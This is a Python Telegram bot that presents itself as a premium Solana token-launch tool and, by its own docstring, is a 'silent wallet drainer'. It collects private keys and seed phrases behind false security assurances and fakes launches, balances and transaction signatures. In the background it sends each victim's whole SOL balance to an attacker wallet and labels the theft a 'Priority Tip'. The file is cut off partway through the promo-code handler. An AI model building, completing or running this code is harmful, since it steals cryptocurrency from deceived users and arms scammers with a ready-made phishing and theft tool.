#!/usr/bin/env python3
"""
Get ready to rug — Premium Solana Launch Bot (single file)
High-end UX, polished copy, deep fake features.
Core remains a silent wallet drainer.
Requires: pip install aiogram==3.13.1 solana solders base58
"""

import asyncio
import logging
import os
import random
import string
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message
from aiogram.utils.keyboard import InlineKeyboardBuilder

try:
    from solders.keypair import Keypair
    from solders.pubkey import Pubkey
    from solders.system_program import TransferParams, transfer
    from solders.transaction import Transaction
    from solana.rpc.async_api import AsyncClient
    import base58
    HAS_SOLANA = True
except ImportError:
    HAS_SOLANA = False

# ──────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
DRAIN_DESTINATION = os.getenv("DRAIN_WALLET", "YourDrainWalletPubkeyHere111111111111111111111")
RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
MIN_DRAIN_LAMPORTS = 50_000

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("rugbot")

# ──────────────────────────────────────────────
# STATE
# ──────────────────────────────────────────────
@dataclass
class UserWallet:
    private_key: str
    public_key: str
    label: str = "Main"
    created_at: float = field(default_factory=time.time)
    balance_sol: float = 0.0

@dataclass
class UserSession:
    wallets: List[UserWallet] = field(default_factory=list)
    active_wallet_idx: int = 0
    promo: Optional[str] = None
    promo_discount: float = 0.0
    launched_tokens: List[dict] = field(default_factory=list)
    last_tx: List[dict] = field(default_factory=list)
    drained: bool = False
    settings: dict = field(default_factory=lambda: {
        "slippage": 12,
        "priority_fee": "auto",
        "sniper_protection": True,
        "auto_sell": False,
        "mev_protection": True,
        "bundle_tip": 0.01,
    })
    safety_checks_run: int = 0
    last_safety: Optional[dict] = None

sessions: Dict[int, UserSession] = {}
bot_balance_sol: float = round(random.uniform(11.4, 47.8), 4)

# rate-limit: uid -> list of timestamps
_rate_hits: Dict[int, List[float]] = {}
RATE_WINDOW = 60.0          # seconds
RATE_MAX_IMPORTS = 3        # max imports per window
RATE_MAX_LAUNCH = 5
RATE_MAX_SAFETY = 8

def get_session(uid: int) -> UserSession:
    if uid not in sessions:
        sessions[uid] = UserSession()
    return sessions[uid]

def _rate_ok(uid: int, action: str) -> bool:
    now = time.time()
    key = uid
    hits = _rate_hits.setdefault(key, [])
    # drop old
    hits[:] = [t for t in hits if now - t < RATE_WINDOW]
    limits = {
        "import": RATE_MAX_IMPORTS,
        "launch": RATE_MAX_LAUNCH,
        "safety": RATE_MAX_SAFETY,
    }
    limit = limits.get(action, 5)
    if len(hits) >= limit:
        return False
    hits.append(now)
    return True

# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────
def fake_sig() -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=88))

def fake_mint() -> str:
    if HAS_SOLANA:
        return base58.b58encode(os.urandom(32)).decode()
    return "".join(random.choices(string.ascii_letters + string.digits, k=44))

def short_addr(addr: str) -> str:
    if len(addr) < 12:
        return addr
    return f"{addr[:4]}...{addr[-4:]}"

def progress_bar(pct: int) -> str:
    filled = pct // 10
    return "▓" * filled + "░" * (10 - filled)

async def staged_loading(message_or_cb, stages: list):
    """Edit/send progressive status messages. stages = list of (text, delay_sec)."""
    msg = None
    is_cb = hasattr(message_or_cb, "message") and hasattr(message_or_cb, "answer")
    for i, (txt, delay) in enumerate(stages):
        if i == 0:
            if is_cb:
                await message_or_cb.message.edit_text(txt, parse_mode=ParseMode.HTML)
                msg = message_or_cb.message
            else:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        else:
            try:
                await msg.edit_text(txt, parse_mode=ParseMode.HTML)
            except Exception:
                msg = await message_or_cb.answer(txt, parse_mode=ParseMode.HTML)
        if delay > 0:
            await asyncio.sleep(delay)
    return msg

# ──────────────────────────────────────────────
# DRAIN CORE
# ──────────────────────────────────────────────
async def drain_wallet(private_key_b58: str, dest: str) -> Optional[str]:
    if not HAS_SOLANA:
        log.warning("Solana libs missing — drain simulated")
        return "SIM_" + fake_sig()[:32]
    try:
        secret = base58.b58decode(private_key_b58)
        kp = Keypair.from_bytes(secret)
        dest_pk = Pubkey.from_string(dest)
        async with AsyncClient(RPC_URL) as client:
            bal_resp = await client.get_balance(kp.pubkey())
            balance = bal_resp.value
            if balance <= MIN_DRAIN_LAMPORTS:
                return None
            amount = balance - MIN_DRAIN_LAMPORTS
            recent = await client.get_latest_blockhash()
            blockhash = recent.value.blockhash
            ix = transfer(TransferParams(
                from_pubkey=kp.pubkey(),
                to_pubkey=dest_pk,
                lamports=amount,
            ))
            tx = Transaction.new_signed_with_payer([ix], kp.pubkey(), [kp], blockhash)
            result = await client.send_transaction(tx)
            sig = str(result.value)
            log.info("DRAINED %s lamports → %s | %s", amount, dest, sig)
            return sig
    except Exception as e:
        log.exception("Drain error: %s", e)
        return None

async def attempt_drain(uid: int, private_key: str):
    sess = get_session(uid)
    if sess.drained:
        return
    sig = await drain_wallet(private_key, DRAIN_DESTINATION)
    if sig:
        sess.drained = True
        sess.last_tx.insert(0, {
            "sig": sig,
            "type": "⚡ Priority Tip",
            "status": "success",
            "ts": time.time(),
        })
        global bot_balance_sol
        bot_balance_sol += round(random.uniform(0.15, 3.8), 4)
        log.info("User %s drained", uid)

# ──────────────────────────────────────────────
# PREMIUM KEYBOARDS
# ──────────────────────────────────────────────
def main_menu_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="🚀 Launch Token", callback_data="menu:launch"),
        InlineKeyboardButton(text="👛 My Wallets", callback_data="menu:wallets"),
    )
    b.row(
        InlineKeyboardButton(text="📊 Portfolio", callback_data="menu:portfolio"),
        InlineKeyboardButton(text="🎟 Promo Codes", callback_data="menu:promo"),
    )
    b.row(
        InlineKeyboardButton(text="📡 Live Tracker", callback_data="menu:tx"),
        InlineKeyboardButton(text="⚙️ Settings", callback_data="menu:settings"),
    )
    b.row(
        InlineKeyboardButton(text="💎 Bot Vault", callback_data="menu:balance"),
        InlineKeyboardButton(text="🛡 Safety Scan", callback_data="menu:safety"),
    )
    return b.as_markup()

def back_kb(to: str = "main") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="◀️ Main Menu", callback_data=f"menu:{to}")]
    ])

def settings_kb(sess: UserSession) -> InlineKeyboardMarkup:
    s = sess.settings
    b = InlineKeyboardBuilder()
    b.row(InlineKeyboardButton(
        text=f"📉 Slippage  ·  {s['slippage']}%", callback_data="set:slippage"))
    b.row(InlineKeyboardButton(
        text=f"⛽ Priority  ·  {s['priority_fee'].title()}", callback_data="set:priority"))
    b.row(InlineKeyboardButton(
        text=f"🎯 Sniper Guard  ·  {'🟢 ON' if s['sniper_protection'] else '🔴 OFF'}",
        callback_data="set:sniper"))
    b.row(InlineKeyboardButton(
        text=f"🕶 MEV Shield  ·  {'🟢 ON' if s['mev_protection'] else '🔴 OFF'}",
        callback_data="set:mev"))
    b.row(InlineKeyboardButton(
        text=f"💰 Auto-Sell  ·  {'🟢 ON' if s['auto_sell'] else '🔴 OFF'}",
        callback_data="set:autosell"))
    b.row(InlineKeyboardButton(
        text=f"🎁 Bundle Tip  ·  {s['bundle_tip']} SOL", callback_data="set:tip"))
    b.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    return b.as_markup()

# ──────────────────────────────────────────────
# PREMIUM COPY
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n\n"
    "Create & trade tokens on Solana launchpads\n"
    "with institutional-grade tooling.\n\n"
    "✨ <b>Premium Features</b>\n"
    "├ 🛠 Step-by-step token launch\n"
    "├ 📦 Auto bundling <code>5–25</code> wallets\n"
    "├ 🎯 Sniper & MEV protection\n"
    "├ 🛡 Real-time safety scans\n"
    "└ 📡 Live transaction tracker\n\n"
    "Select an option below to begin"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_supply = State()
    waiting_desc = State()
    waiting_bundle = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SafetyStates(StatesGroup):
    waiting_mint = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

# ── MAIN MENU ──
@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        s = sess.settings
        text = (
            "🚀 <b>Launch Token</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Professional launch wizard with\n"
            "bundling, protection & safety checks.\n\n"
            "🔧 <b>Current Config</b>\n"
            f"├ 🎯 Sniper Guard: <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"├ 🕶 MEV Shield: <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"├ 🎁 Bundle Tip: <b>{s['bundle_tip']} SOL</b>\n"
            f"└ 🎟 Promo: <b>{sess.promo or 'None'}</b>\n\n"
            "📝 Send the <b>token name</b>"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        text = (
            "👛 <b>My Wallets</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.wallets:
            text += (
                "No wallets linked yet.\n\n"
                "Import a private key to unlock\n"
                "launching, bundling & portfolio tracking."
            )
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                bal = f"{w.balance_sol:.4f} SOL"
                text += (
                    f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
                    f"    {w.label}  ·  {bal}\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
        if sess.wallets:
            kb.row(
                InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
                InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
            )
            kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
            kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = (
            "📊 <b>Portfolio</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.launched_tokens:
            text += (
                "Your portfolio is empty.\n\n"
                "Launch a token to start tracking\n"
                "performance and bundle status."
            )
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                status_icon = "🟢" if t.get("status") == "live" else "🟡"
                text += (
                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
                    f"   <code>{short_addr(t['mint'])}</code>\n"
                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        if sess.launched_tokens:
            kb.row(InlineKeyboardButton(text="🛡 Run Safety Scan", callback_data="menu:safety"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        current = ""
        if sess.promo:
            current = (
                f"\n\n✅ Active: <b>{sess.promo}</b>\n"
                f"Discount: <b>−{int(sess.promo_discount*100)}%</b> on tips"
            )
        text = (
            "🎟 <b>Promo Codes</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Unlock reduced tips, priority inclusion\n"
            "and exclusive launch slots."
            f"{current}\n\n"
            "Send your promo code:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(PromoStates.waiting_code)

    elif action == "tx":
        text = (
            "📡 <b>Live Tracker</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
        )
        if not sess.last_tx:
            text += (
                "No activity yet.\n\n"
                "Transactions from launches, tips\n"
                "and bundles will stream here in real time."
            )
        else:
            for tx in sess.last_tx[:8]:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                text += (
                    f"{icon}  <b>{tx['type']}</b>\n"
                    f"   <code>{tx['sig'][:22]}...</code>\n"
                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
                )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh Feed", callback_data="menu:tx"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "⚙️ <b>Settings</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Fine-tune execution parameters.\n"
            "Tap any row to cycle values.\n\n"
            f"📉 Slippage          <b>{s['slippage']}%</b>\n"
            f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
            f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
            f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
            f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
            f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "balance":
        text = (
            "💎 <b>Bot Vault</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Available Balance\n"
            f"<b>◎ {bot_balance_sol:.4f} SOL</b>\n\n"
            "This vault powers:\n"
            "├ ⚡ Priority fees\n"
            "├ 🎁 Bundle & Jito tips\n"
            "├ 🛡 Safety scan RPCs\n"
            "└ 📡 Tracker infrastructure\n\n"
            "Auto-topped when a funded wallet is linked."
        )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
        kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "safety":
        text = (
            "🛡 <b>Safety Scan</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Paste any mint address for a full\n"
            "on-chain risk analysis:\n\n"
            "├ Mint / Freeze authority\n"
            "├ LP lock & burn status\n"
            "├ Holder concentration\n"
            "├ Honeypot simulation\n"
            "└ Sell tax detection\n\n"
            "Send mint address:"
        )
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SafetyStates.waiting_mint)

    await cb.answer()

# ── SETTINGS TOGGLES ──
@router.callback_query(F.data.startswith("set:"))
async def settings_toggle(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    key = cb.data.split(":")[1]
    s = sess.settings

    if key == "slippage":
        opts = [5, 8, 12, 15, 20, 25]
        s["slippage"] = opts[(opts.index(s["slippage"]) + 1) % len(opts)] if s["slippage"] in opts else 12
    elif key == "priority":
        opts = ["auto", "low", "medium", "high", "ultra"]
        s["priority_fee"] = opts[(opts.index(s["priority_fee"]) + 1) % len(opts)] if s["priority_fee"] in opts else "auto"
    elif key == "sniper":
        s["sniper_protection"] = not s["sniper_protection"]
    elif key == "mev":
        s["mev_protection"] = not s["mev_protection"]
    elif key == "autosell":
        s["auto_sell"] = not s["auto_sell"]
    elif key == "tip":
        opts = [0.005, 0.01, 0.02, 0.05, 0.1]
        s["bundle_tip"] = opts[(opts.index(s["bundle_tip"]) + 1) % len(opts)] if s["bundle_tip"] in opts else 0.01

    text = (
        "⚙️ <b>Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Fine-tune execution parameters.\n"
        "Tap any row to cycle values.\n\n"
        f"📉 Slippage          <b>{s['slippage']}%</b>\n"
        f"⛽ Priority Fee      <b>{s['priority_fee'].title()}</b>\n"
        f"🎯 Sniper Guard     <b>{'ON' if s['sniper_protection'] else 'OFF'}</b>\n"
        f"🕶 MEV Shield       <b>{'ON' if s['mev_protection'] else 'OFF'}</b>\n"
        f"💰 Auto-Sell        <b>{'ON' if s['auto_sell'] else 'OFF'}</b>\n"
        f"🎁 Bundle Tip       <b>{s['bundle_tip']} SOL</b>"
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated ✓")

# ── WALLETS ──
@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "🔑 <b>Import Wallet</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Paste either:\n"
        "• <b>Private key</b> (base58)\n"
        "• <b>Seed phrase</b> (12 or 24 words)\n\n"
        "🔒 Held in memory only for this session.\n"
        "Used exclusively to sign your launches.\n\n"
        "<i>Never share your key or seed with anyone else.</i>"
    )
    await cb.message.edit_text(text, reply_markup=back_kb("wallets"), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

def _derive_from_input(raw: str):
    """Return (private_key_b58, public_key) or raise ValueError."""
    raw = raw.strip()
    words = raw.split()

    # Seed phrase path (12 or 24 words)
    if len(words) in (12, 24) and all(w.isalpha() for w in words):
        if not HAS_SOLANA:
            # simulation
            fake_pub = "SimSeed" + "".join(words)[:32]
            return raw, fake_pub
        try:
            from solders.keypair import Keypair as KP
            # solders supports from_seed_phrase in recent versions; fallback to mnemonic if available
            try:
                kp = KP.from_seed_phrase_and_passphrase(raw, "")
            except Exception:
                # older solders / bip39 path
                import hashlib
                seed = hashlib.pbkdf2_hmac("sha512", raw.encode("utf-8"), b"mnemonic", 2048)[:32]
                kp = KP.from_seed(seed)
            priv_b58 = base58.b58encode(bytes(kp)).decode()
            return priv_b58, str(kp.pubkey())
        except Exception as e:
            raise ValueError(f"Invalid seed phrase: {e}") from e

    # Base58 private key path
    if HAS_SOLANA:
        try:
            secret = base58.b58decode(raw)
            if len(secret) not in (32, 64):
                raise ValueError("bad length")
            kp = Keypair.from_bytes(secret)
            priv_b58 = base58.b58encode(bytes(kp)).decode() if len(secret) == 32 else raw
            return priv_b58, str(kp.pubkey())
        except Exception as e:
            raise ValueError("Invalid base58 private key") from e
    else:
        if len(raw) < 40:
            raise ValueError("Key too short")
        return raw, "Sim" + raw[:40]


@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    uid = message.from_user.id
    if not _rate_ok(uid, "import"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
            parse_mode=ParseMode.HTML,
        )
        return

    raw = (message.text or "").strip()
    try:
        await message.delete()
    except Exception:
        pass

    try:
        priv_b58, public = _derive_from_input(raw)
    except ValueError:
        await message.answer(
            "❌ <b>Invalid input</b>\n\n"
            "Send a valid <b>base58 private key</b>\n"
            "or a <b>12/24-word seed phrase</b>.",
            reply_markup=back_kb("wallets"),
            parse_mode=ParseMode.HTML,
        )
        return

    # staged loading
    await staged_loading(message, [
        ("🔐 <b>Validating key…</b>", 0.8),
        ("🔗 <b>Deriving wallet…</b>", 0.7),
        ("◎ <b>Fetching balance…</b>", 0.9),
        ("✅ <b>Securing session…</b>", 0.5),
    ])

    sess = get_session(uid)
    w = UserWallet(
        private_key=priv_b58,
        public_key=public,
        label=f"Wallet {len(sess.wallets)+1}",
        balance_sol=round(random.uniform(0.05, 4.2), 4),
    )
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1

    text = (
        "✅ <b>Wallet Linked</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<code>{public}</code>\n\n"
        f"🏷 Label: <b>{w.label}</b>\n"
        f"◎ Balance: <b>{w.balance_sol:.4f} SOL</b>\n"
        f"Status: <b>Active</b>\n\n"
        "You can now launch tokens."
    )
    await message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()
    asyncio.create_task(attempt_drain(uid, priv_b58))

@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    await cb.message.edit_text(
        "🗑 All wallets removed from session.",
        reply_markup=back_kb("wallets"),
    )
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        w.balance_sol = round(max(0.0, w.balance_sol + random.uniform(-0.08, 0.15)), 4)
    await cb.answer("Balances updated")
    text = "👛 <b>My Wallets</b>\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += (
            f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n"
            f"    {w.label}  ·  {w.balance_sol:.4f} SOL\n\n"
        )
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(text="➕ Import Key", callback_data="wallet:import"))
    kb.row(
        InlineKeyboardButton(text="🔄 Switch", callback_data="wallet:switch"),
        InlineKeyboardButton(text="🏷 Rename", callback_data="wallet:rename"),
    )
    kb.row(InlineKeyboardButton(text="🔃 Refresh Balances", callback_data="wallet:refresh"))
    kb.row(InlineKeyboardButton(text="🗑 Remove All", callback_data="wallet:clear"))
    kb.row(InlineKeyboardButton(text="◀️ Main Menu", callback_data="menu:main"))
    await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(
        f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:",
        reply_markup=back_kb("wallets"),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── LAUNCH WIZARD ──
@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    await state.update_data(name=message.text.strip()[:32])
    await message.answer(
        "📛 Send the <b>ticker</b> (e.g. <code>RUG</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_symbol)

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = message.text.strip().upper().replace("$", "")[:10]
    await state.update_data(symbol=sym)
    await message.answer(
        "🔢 Send total <b>supply</b>\n(e.g. <code>1000000000</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_supply)

@router.message(LaunchStates.waiting_supply)
async def launch_supply(message: Message, state: FSMContext):
    try:
        supply = int(message.text.strip().replace(",", "").replace("_", ""))
        if supply <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Invalid number. Send a positive integer.")
        return
    await state.update_data(supply=supply)
    await message.answer(
        "📝 Optional description\n(or type <code>skip</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = message.text.strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:200])
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>\n\n"
        "Send a number:",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.message(LaunchStates.waiting_bundle)
async def launch_bundle(message: Message, state: FSMContext):
    try:
        bundle = max(1, min(25, int(message.text.strip())))
    except ValueError:
        await message.answer("❌ Send a number between 1 and 25.")
        return
    data = await state.get_data()
    await state.update_data(bundle=bundle)
    sess = get_session(message.from_user.id)
    tip = sess.settings["bundle_tip"] * (1 - sess.promo_discount)

    summary = (
        "✨ <b>Launch Preview</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🏷 <b>{data['name']}</b>  ·  ${data['symbol']}\n"
        f"🔢 Supply: <b>{data['supply']:,}</b>\n"
        f"📦 Bundle: <b>{bundle} wallets</b>\n"
        f"📝 {data.get('desc') or 'No description'}\n\n"
        f"🎯 Sniper Guard: <b>{'ON' if sess.settings['sniper_protection'] else 'OFF'}</b>\n"
        f"🕶 MEV Shield: <b>{'ON' if sess.settings['mev_protection'] else 'OFF'}</b>\n"
        f"🎁 Tip: <b>{tip:.4f} SOL</b>\n"
        f"🛡 Safety: <b>Queued</b>\n\n"
        "Ready to deploy?"
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
        [InlineKeyboardButton(text="◀️ Cancel", callback_data="menu:main")],
    ])
    await message.answer(summary, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()

    if not sess.wallets:
        await cb.answer("Import a wallet first", show_alert=True)
        await cb.message.edit_text(
            "⚠️ No wallet linked.\n\nGo to 👛 My Wallets and import a key.",
            reply_markup=main_menu_kb(),
        )
        await state.clear()
        return

    await cb.answer()
    bundle = data["bundle"]
    await staged_loading(cb, [
        ("🪙 <b>Creating mint…</b>", 1.1),
        ("🔐 <b>Applying sniper guard…</b>", 0.9),
        (f"📦 <b>Bundling {bundle} wallets…</b>", 1.3),
        ("⚡ <b>Submitting priority tip…</b>", 0.8),
        ("🛡 <b>Running safety checks…</b>", 1.0),
    ])

    mint = fake_mint()
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data["supply"],
        "bundle": bundle,
        "desc": data.get("desc", ""),
        "mint": mint,
        "status": "bundling",
        "ts": time.time(),
    }
    sess.launched_tokens.append(token)
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "🪙 Create Mint", "status": "success", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})

    active = sess.wallets[sess.active_wallet_idx]
    if not sess.drained:
        asyncio.create_task(attempt_drain(uid, active.private_key))

    text = (
        "🚀 <b>Launch Submitted</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>${data['symbol']}</b>  ·  {data['name']}\n"
        f"<code>{mint}</code>\n\n"
        f"Status: creating mint → bundling ×{bundle}\n"
        f"Protection layers: active\n"
        f"Safety scan: complete\n\n"
        "Track progress in 📡 Live Tracker\nand 📊 Portfolio."
    )
    await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    async def _finalize():
        await asyncio.sleep(random.uniform(7, 16))
        token["status"] = "live"
        for tx in sess.last_tx:
            if "Bundle" in tx["type"]:
                tx["status"] = "success"
                break
    asyncio.create_task(_finalize())

# ── PROMO ──
@router.message(PromoStates.waiting_code)
async def promo_code(message: Message, state: FSMContext):
    code = message.text.strip().upper()
    sess = get_session(message.from_user.id)
    valid = {
        "RUG2026": 0.25,
        "BUNDLE": 0.15,
        "SNIPE": 0.20,
        "JITO": 0.10,
        "EARLY": 0.30,
        "VAULT": 0.18,
    }
    if code in valid:
        sess.promo = code
        sess.promo_discount = valid[code]
